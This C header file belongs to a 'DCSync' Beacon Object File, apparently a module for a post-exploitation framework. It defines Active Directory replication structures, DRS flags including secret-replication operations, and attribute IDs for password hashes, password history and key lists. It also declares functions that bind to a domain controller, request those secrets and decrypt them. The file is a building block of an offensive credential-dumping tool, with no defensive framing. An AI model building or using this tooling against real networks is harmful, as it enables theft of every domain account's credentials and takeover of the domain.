/*
 * DCSync BOF - Common Header
 * 
 * Shared type definitions, constants, and function declarations
 * for the DCSync Beacon Object File implementation.
 */

#ifndef DCSYNC_H
#define DCSYNC_H

#include <windows.h>
#include <rpc.h>
#include <wincrypt.h>

// ============================================================================
// Debug Output Macros
// ============================================================================

// Optional debug output (disable with -DNDEBUG for smaller binary)
#ifndef NDEBUG
#define DEBUG_PRINT(level, ...) BeaconPrintf(level, __VA_ARGS__)
#else
#define DEBUG_PRINT(level, ...) do { } while(0)
#endif

// Always print errors and critical output
#define OUTPUT_PRINT(...) BeaconPrintf(CALLBACK_OUTPUT, __VA_ARGS__)
#define ERROR_PRINT(...) BeaconPrintf(CALLBACK_ERROR, __VA_ARGS__)

// ============================================================================
// DRSUAPI Type Definitions
// ============================================================================

typedef LONGLONG DSTIME;
typedef void *DRS_HANDLE;

typedef struct {
    unsigned char Data[28];
} NT4SID;

typedef struct {
    unsigned long structLen;
    unsigned long SidLen;
    GUID Guid;
    NT4SID Sid;
    unsigned long NameLen;
    WCHAR StringName[1];
} DSNAME;

typedef LONGLONG USN;

typedef struct {
    USN usnHighObjUpdate;
    USN usnReserved;
    USN usnHighPropUpdate;
} USN_VECTOR;

typedef struct {
    UUID uuidDsa;
    USN usnHighPropUpdate;
} UPTODATE_CURSOR_V1;

typedef struct {
    DWORD dwVersion;
    DWORD dwReserved1;
    DWORD cNumCursors;
    DWORD dwReserved2;
    UPTODATE_CURSOR_V1 rgCursors[1];
} UPTODATE_VECTOR_V1_EXT;

typedef struct {
    unsigned int length;
    BYTE *elements;
} OID_t;

typedef struct {
    unsigned long ndx;
    OID_t prefix;
} PrefixTableEntry;

typedef struct {
    DWORD PrefixCount;
    PrefixTableEntry *pPrefixEntry;
} SCHEMA_PREFIX_TABLE;

typedef ULONG ATTRTYP;

typedef struct {
    DWORD dwVersion;
    DWORD dwReserved1;
    DWORD cAttrs;
    ATTRTYP rgPartialAttr[1];
} PARTIAL_ATTR_VECTOR_V1_EXT;

typedef struct {
    ULONG valLen;
    UCHAR *pVal;
} ATTRVAL;

typedef struct {
    ULONG valCount;
    ATTRVAL *pAVal;
} ATTRVALBLOCK;

typedef struct {
    ATTRTYP attrTyp;
    ATTRVALBLOCK AttrVal;
} ATTR;

typedef struct {
    ULONG attrCount;
    ATTR *pAttr;
} ATTRBLOCK;

typedef struct {
    DSNAME *pObject;
    ULONG fIsDefunct;
    ATTRBLOCK AttrBlock;
} ENTINF;

typedef struct REPLENTINFLIST {
    struct REPLENTINFLIST *pNextEntInf;
    ENTINF Entinf;
    BOOL fIsNCPrefix;
    UUID uuidDsaOrgPg;
    USN_VECTOR UsnPropUpd;
    DWORD __pad;
} REPLENTINFLIST;

// DRS Extensions  
typedef struct {
    DWORD cb;
    BYTE rgb[1];
} DRS_EXTENSIONS;

typedef struct {
    DWORD cb;
    DWORD dwFlags;
    GUID SiteObjGuid;
    DWORD Pid;
    DWORD dwReplEpoch;
} DRS_EXTENSIONS_INT;

// V8 Request
typedef struct {
    UUID uuidDsaObjDest;
    UUID uuidInvocIdSrc;
    DSNAME *pNC;
    USN_VECTOR usnvecFrom;
    UPTODATE_VECTOR_V1_EXT *pUpToDateVecDest;
    ULONG ulFlags;
    ULONG cMaxObjects;
    ULONG cMaxBytes;
    ULONG ulExtendedOp;
    LONGLONG liFsmoInfo;
    PARTIAL_ATTR_VECTOR_V1_EXT *pPartialAttrSet;
    PARTIAL_ATTR_VECTOR_V1_EXT *pPartialAttrSetEx;
    SCHEMA_PREFIX_TABLE PrefixTableDest;
} DRS_MSG_GETCHGREQ_V8;

// V10 Request (adds dwReservedUSN1, dwReservedUSN2, pUpToDateVecDestV2, dwReplicaHigh, dwReplicaLow, dwReservedUSN3)
typedef struct {
    UUID uuidDsaObjDest;
    UUID uuidInvocIdSrc;
    DSNAME *pNC;
    USN_VECTOR usnvecFrom;
    UPTODATE_VECTOR_V1_EXT *pUpToDateVecDest;
    ULONG ulFlags;
    ULONG cMaxObjects;
    ULONG cMaxBytes;
    ULONG ulExtendedOp;
    ULARGE_INTEGER liFsmoInfo;
    PARTIAL_ATTR_VECTOR_V1_EXT *pPartialAttrSet;
    PARTIAL_ATTR_VECTOR_V1_EXT *pPartialAttrSetEx;
    SCHEMA_PREFIX_TABLE PrefixTableDest;
} DRS_MSG_GETCHGREQ_V10;

// V1 Reply
typedef struct {
    UUID uuidDsaObjSrc;
    UUID uuidInvocIdSrc;
    DSNAME *pNC;
    USN_VECTOR usnvecFrom;
    USN_VECTOR usnvecTo;
    UPTODATE_VECTOR_V1_EXT *pUpToDateVecSrcV1;
    SCHEMA_PREFIX_TABLE PrefixTableSrc;
    ULONG ulExtendedRet;
    ULONG cNumObjects;
    ULONG cNumBytes;
    REPLENTINFLIST *pObjects;
    BOOL fMoreData;
} DRS_MSG_GETCHGREPLY_V1;

// V6 Reply
typedef struct {
    UUID uuidDsaObjSrc;
    UUID uuidInvocIdSrc;
    DSNAME *pNC;
    USN_VECTOR usnvecFrom;
    USN_VECTOR usnvecTo;
    UPTODATE_VECTOR_V1_EXT *pUpToDateVecSrc;
    SCHEMA_PREFIX_TABLE PrefixTableSrc;
    ULONG ulExtendedRet;
    ULONG cNumObjects;
    ULONG cNumBytes;
    REPLENTINFLIST *pObjects;
    BOOL fMoreData;
    ULONG cNumNcSizeObjects;
    ULONG cNumNcSizeValues;
    DWORD cNumValues;
    void *rgValues;
    DWORD dwDRSError;
} DRS_MSG_GETCHGREPLY_V6;

typedef union {
    DRS_MSG_GETCHGREQ_V8 V8;
    DRS_MSG_GETCHGREQ_V10 V10;
} DRS_MSG_GETCHGREQ;

typedef union {
    DRS_MSG_GETCHGREPLY_V1 V1;
    DRS_MSG_GETCHGREPLY_V6 V6;
} DRS_MSG_GETCHGREPLY;

// ============================================================================
// RPC & Security Type Definitions
// ============================================================================

typedef union _CLIENT_CALL_RETURN {
    void *Pointer;
    LONG_PTR Simple;
} CLIENT_CALL_RETURN;

typedef struct _SecHandle {
    ULONG_PTR dwLower;
    ULONG_PTR dwUpper;
} SecHandle;

typedef SecHandle CtxtHandle;
typedef SecHandle *PSecHandle;
typedef PSecHandle PCtxtHandle;

typedef struct _SecPkgContext_SessionKey {
    ULONG SessionKeyLength;
    PBYTE SessionKey;
} SecPkgContext_SessionKey;

typedef struct _ENCRYPTED_PAYLOAD {
    BYTE Salt[16];
    DWORD CheckSum;
    BYTE EncryptedData[1];  // Variable length
} ENCRYPTED_PAYLOAD, *PENCRYPTED_PAYLOAD;



// ============================================================================
// Constants & Definitions
// ============================================================================

// Code page
#define CP_ACP 0

// RPC Security
#define RPC_C_AUTHN_LEVEL_PKT_PRIVACY 6
#define RPC_C_AUTHN_GSS_NEGOTIATE 9
#define SECPKG_ATTR_SESSION_KEY 9
#define RPC_C_OPT_SECURITY_CALLBACK 10

// DRS Extended Operations
#define EXOP_REPL_OBJ 6
#define EXOP_REPL_SECRETS 3

// DRS Flags
#define DRS_INIT_SYNC                    0x00000001
#define DRS_WRIT_REP                     0x00000010
#define DRS_NEVER_SYNCED                 0x00000020
#define DRS_FULL_SYNC_NOW                0x00000200
#define DRS_SYNC_URGENT                  0x00008000
#define DRS_GET_ANC                      0x00000008
#define DRS_GET_NC_SIZE                  0x00001000
#define DRS_SPECIAL_SECRET_PROCESSING    0x00000004

// Attribute Types
#define ATT_UNICODE_PWD          0x9005A
#define ATT_NT_PWD_HISTORY       0x9005E
#define ATT_LM_PWD_HISTORY       0x900A0
#define ATT_SUPPLEMENTAL_CREDS   0x9007D
#define ATT_SAM_ACCOUNT_NAME     0x900DD
#define ATT_SAM_ACCOUNT_TYPE     0x9012E
#define ATT_USER_PRINCIPAL_NAME  0x90290
#define ATT_OBJECT_SID           0x90092
#define ATT_PEK_LIST             0x90481

// Crypto Constants
#define PROV_RSA_AES 24
#define PROV_RSA_FULL 1
#define PLAINTEXTKEYBLOB 0x8
// CALG_DES is already defined in wincrypt.h

// Status Codes
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif
#ifndef STATUS_BUFFER_TOO_SMALL
#define STATUS_BUFFER_TOO_SMALL ((NTSTATUS)0xC0000023L)
#endif

// Kerberos
#define MICROSOFT_KERBEROS_NAME_A "Kerberos"
#define KERB_ETYPE_RC4_HMAC_MD5 23

// sAMAccountType values for account type detection
#define SAM_USER_OBJECT        0x30000000  // Normal user account
#define SAM_MACHINE_ACCOUNT    0x30000001  // Computer/workstation account
#define SAM_TRUST_ACCOUNT      0x30000002  // Trust account

// ============================================================================
// Function Declarations
// ============================================================================

// DRSUAPI Functions (from RPC stub)
ULONG IDL_DRSBind(
    RPC_BINDING_HANDLE hDrs,
    UUID *puuidClientDsa,
    DRS_EXTENSIONS_INT *pextClient,
    DRS_EXTENSIONS_INT **ppextServer,
    DRS_HANDLE *phDrs);

ULONG IDL_DRSUnbind(DRS_HANDLE *phDrs);

ULONG IDL_DRSGetNCChanges(
    DRS_HANDLE hDrs,
    DWORD dwInVersion,
    DRS_MSG_GETCHGREQ *pmsgIn,
    DWORD *pdwOutVersion,
    DRS_MSG_GETCHGREPLY *pmsgOut);

// Utility Functions
void BytesToHex(const BYTE* bytes, DWORD len, char* output);
DWORD GetRIDFromSID(const BYTE* sid, DWORD sidLen);

// Crypto Functions
BOOL DecryptRC4(const BYTE* encData, DWORD encLen, const BYTE* key, BYTE* output);
BOOL DecryptRC4WithRawKey(const BYTE* encData, DWORD encLen, const BYTE* key, DWORD keyLen, BYTE* output);
BOOL DecryptDESWithRid(const BYTE* encData, DWORD rid, BYTE* output);
BOOL DecryptWithSessionKey(
    const BYTE* encryptedData,
    DWORD encryptedLen,
    const BYTE* sessionKey,
    DWORD sessionKeyLen,
    BYTE* output,
    DWORD* outputLen);

// RPC Functions
RPC_BINDING_HANDLE CreateDRSBinding(const char* dcHostname);
void RPC_ENTRY RpcSecurityCallback(void *Context);

// DSNAME Functions
DSNAME* BuildDSName(const char* dn, const GUID* guid);

// Utility Functions
void InitDRSRequest(DRS_MSG_GETCHGREQ* request, const GUID* dcGuid, DSNAME* targetDsname);

// Processing Functions
void ProcessCredentials(REPLENTINFLIST* objects, const char* samAccountName, const char* dcHostname, const BYTE* sessionKey, DWORD sessionKeyLen);

// ============================================================================
// Shared DECLSPEC Imports
// ============================================================================

// MSVCRT Functions
DECLSPEC_IMPORT int __cdecl MSVCRT$_snprintf(char* buffer, size_t count, const char* format, ...);
DECLSPEC_IMPORT void* __cdecl MSVCRT$memset(void* dest, int c, size_t count);
DECLSPEC_IMPORT void* __cdecl MSVCRT$memcpy(void* dest, const void* src, size_t count);
DECLSPEC_IMPORT size_t __cdecl MSVCRT$strlen(const char* str);
DECLSPEC_IMPORT char* __cdecl MSVCRT$strcat(char* dest, const char* src);
DECLSPEC_IMPORT void* __cdecl MSVCRT$malloc(size_t size);
DECLSPEC_IMPORT void __cdecl MSVCRT$free(void* ptr);

// Kernel32 Functions
DECLSPEC_IMPORT void __cdecl KERNEL32$Sleep(unsigned int milliseconds);

// RPC Functions
DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcStringBindingComposeA(
    unsigned char* ObjUuid,
    unsigned char* ProtSeq,
    unsigned char* NetworkAddr,
    unsigned char* Endpoint,
    unsigned char* Options,
    unsigned char** StringBinding);

DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcBindingFromStringBindingA(
    unsigned char* StringBinding,
    RPC_BINDING_HANDLE* Binding);

DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcStringFreeA(unsigned char** String);
DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcBindingFree(RPC_BINDING_HANDLE* Binding);

DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcBindingSetAuthInfoA(
    RPC_BINDING_HANDLE Binding,
    unsigned char* ServerPrincName,
    unsigned long AuthnLevel,
    unsigned long AuthnSvc,
    void* AuthIdentity,
    unsigned long AuthzSvc);

DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcBindingSetOption(
    RPC_BINDING_HANDLE hBinding,
    unsigned long option,
    ULONG_PTR optionValue);

DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$I_RpcBindingInqSecurityContext(
    RPC_BINDING_HANDLE Binding,
    void** SecurityContextHandle);

DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$UuidCreate(UUID* Uuid);

DECLSPEC_IMPORT CLIENT_CALL_RETURN RPC_VAR_ENTRY RPCRT4$NdrClientCall2(
    void* pStubDescriptor,
    void* pFormat,
    ...);

// Crypto Functions
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptAcquireContextA(
    HCRYPTPROV* phProv,
    LPCSTR szContainer,
    LPCSTR szProvider,
    DWORD dwProvType,
    DWORD dwFlags);

DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptReleaseContext(
    HCRYPTPROV hProv,
    DWORD dwFlags);

DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptCreateHash(
    HCRYPTPROV hProv,
    ALG_ID Algid,
    HCRYPTKEY hKey,
    DWORD dwFlags,
    HCRYPTHASH* phHash);

DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptHashData(
    HCRYPTHASH hHash,
    const BYTE* pbData,
    DWORD dwDataLen,
    DWORD dwFlags);

DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptDeriveKey(
    HCRYPTPROV hProv,
    ALG_ID Algid,
    HCRYPTHASH hBaseData,
    DWORD dwFlags,
    HCRYPTKEY* phKey);

DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptDecrypt(
    HCRYPTKEY hKey,
    HCRYPTHASH hHash,
    BOOL Final,
    DWORD dwFlags,
    BYTE* pbData,
    DWORD* pdwDataLen);

DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptImportKey(
    HCRYPTPROV hProv,
    const BYTE* pbData,
    DWORD dwDataLen,
    HCRYPTKEY hPubKey,
    DWORD dwFlags,
    HCRYPTKEY* phKey);

DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptGetHashParam(
    HCRYPTHASH hHash,
    DWORD dwParam,
    BYTE* pbData,
    DWORD* pdwDataLen,
    DWORD dwFlags);

DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptDestroyKey(HCRYPTKEY hKey);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptDestroyHash(HCRYPTHASH hHash);

DECLSPEC_IMPORT NTSTATUS WINAPI ADVAPI32$SystemFunction025(
    const BYTE* EncryptedData,
    const DWORD* Key,
    BYTE* DecryptedData);

DECLSPEC_IMPORT SECURITY_STATUS WINAPI SECUR32$QueryContextAttributesA(
    PCtxtHandle phContext,
    unsigned long ulAttribute,
    void* pBuffer);

DECLSPEC_IMPORT SECURITY_STATUS WINAPI SECUR32$FreeContextBuffer(
    void* pvContextBuffer);

// ============================================================================
// Global Variables (External)
// ============================================================================

#endif // DCSYNC_H
